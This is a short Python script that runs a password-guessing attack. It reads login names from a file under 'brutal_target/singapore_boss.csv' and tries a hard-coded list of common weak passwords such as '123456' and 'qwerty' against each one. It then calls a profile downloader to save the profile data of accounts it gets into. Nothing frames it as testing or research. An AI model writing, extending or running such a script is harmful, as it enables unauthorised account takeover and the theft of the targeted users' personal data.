from library import UserDataSaver, get_config, ApiClient, parse_phone
import pandas as pd
import profile_downloader

def get_second_column(filename):
    df = pd.read_csv(filename, header=None)   # or header=0 if the file has a header
    return df.iloc[:, 0].tolist()

def main():

    
    login_list = get_second_column('brutal_target/singapore_boss.csv')

    # login_list = [x for x in login_list if x not in to_be_removed]

    failing_list = []
    trying_passwords = ["123456",'123456789','qwerty','password','12345678','111111','1234567','1234567890','abc123','123123', '88888888']
    trying_passwords.reverse()
    profile_downloader.download_boss(login_list, trying_passwords, 65, 'new_bosses')



if __name__ == "__main__":
    main()
